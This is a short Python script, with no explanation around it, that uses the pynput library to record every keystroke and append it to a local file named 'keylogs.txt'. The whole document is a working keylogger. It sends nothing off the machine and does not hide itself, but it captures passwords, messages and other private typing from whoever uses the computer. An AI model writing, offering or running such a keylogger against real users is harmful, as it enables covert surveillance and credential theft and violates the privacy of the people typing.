from pynput import keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            f.write(key.char)
    except AttributeError:
        with open("keylogs.txt", "a") as f:
            f.write(str(key))

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
